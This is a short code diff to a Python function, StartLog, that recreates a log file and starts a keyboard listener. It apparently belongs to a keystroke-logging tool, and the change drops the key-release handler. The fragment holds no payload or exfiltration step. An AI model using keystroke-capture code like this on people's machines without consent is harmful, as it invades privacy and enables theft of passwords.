@@ -99,7 +99,7 @@ def StartLog():
     recreate_file(FILENAME)
 
     # Create Keyboard Listener.
-    with Listener(on_press=on_press, on_release=on_release) as listener:
+    with Listener(on_press=on_press) as listener:
         listener.join()
 
         if not listener.running:  # If Listener is no longer running, it is finished.
